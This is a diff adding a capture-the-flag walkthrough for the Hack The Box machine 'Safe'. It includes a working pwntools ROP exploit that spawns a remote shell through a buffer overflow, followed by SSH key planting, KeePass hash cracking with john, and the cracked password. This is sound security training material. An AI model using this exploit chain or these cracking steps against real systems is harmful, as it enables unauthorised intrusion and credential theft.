@@ -1,0 +1,115 @@
+HTB-Safe-Writeup
+
+IP : 10.10.10.147
+
+Nmap
+----
+- nmap shows 3 open ports 
+	- 22 running SSH
+	- 80 running Apache/2.4.25
+	- an unknown service on port 1337
+
+Enumeration
+-----------
+- going to port 80 gives a default debian page 
+- directory brute forcing for sub directories and we found nothing
+- we check the page source and found that a program called myapp can be downloaded from /myapp sub directory
+- we can download it  
+
+	wget http://safe.htb/myapp
+
+- on running the app we found that it simply asks for a string and prints it back 
+- the comment from the page source said that the program is running on port 1337
+- we can try to connect to it through netcat
+
+	nc safe.htb 1337
+
+- we get the same behaviour
+- looks like giving it a long string breaks it which indicates a buffer overflow vulnerability 
+- using checksec to check for properties of the executables we found that NX (No Execute) is enabled and we wont be able to execute shellcode
+- we can boot up gef tool to dive deepen into this 
+- create a pattern with gef
+
+	pattern create 
+
+- the pattern will be saved as '$_gef0'
+- we start the application from gef 
+
+	r
+
+- we found the offset to be 120 bytes which means that after 120 bytes we can overwrite rip
+- we can check for the functions in gef
+
+	info functions 
+
+- we noticed a function called test and we can dissable it to understand what it does 
+	
+	disass test
+
+- we found the offset to be 120 bytes after that we can overwrite rip but 8 bits before that we can overwrite rbp
+- by looking at the rop gadgets we can see a gadget that pops r13, r14, r15 then returns 
+
+	ropper --file myapp
+
+- the exlpoit
+
+	#!/usr/bin/python
+	from pwn import *
+
+	elf = ELF("./myapp")
+	rop = ROP(elf)
+
+	POP_R13_R14_R15 = (rop.find_gadget(['pop r13', 'pop r14', 'pop r15', 'ret']))[0]
+	TEST = elf.symbols['test']
+	SYSTEM = elf.plt['system']
+
+	payload = ""
+	payload += "A" * 112
+	payload += "/bin/sh\x00"
+	payload += p64(POP_R13_R14_R15)
+	payload += p64(SYSTEM)
+	payload += "A" * 16
+	payload += p64(TEST)
+
+	log.info("pop r13, r14, r15 gadget: " + hex(POP_R13_R14_R15))
+	log.info("test: " + hex(TEST))
+	log.info("system: " + hex(SYSTEM))
+
+	p = remote("safe.htb",1337)
+	p.sendline(payload)
+	p.sendline("\n")
+	p.interactive() 
+
+- we can run the exploit
+
+	./exploit.py 
+
+- we have user shell
+- grab the user flag
+
+Priv-esc
+--------
+- we can drop our public key to authorized_keys files to connect over SSH to get a shell
+- now we can ssh into the machine with ease 
+- on enumerating we found a few more files in the home directory besides user flag
+- we found MyPasswords.kdbx which is a KeePass database 
+- we can use keepass2john to generate a hash for the database file and crack it with hashcat
+
+	keepass2john -k IMG_0547.JPG ./MyPasswords.kdbx > hash.txt
+
+- crack the hash with john
+
+	john --wordlist=./rockyou.txt ./hash.txt
+
+	creds : bullshit
+
+- once we get the password we can use that to read the database file
+
+	kpcli --key=IMG_0547.jpg --kdb=MyPasswords.kdbx
+	ls
+	show -f 0
+
+- grab the password from the database 
+- su into root and enter the password
+- we will get a root shell
+- grab the root flag  
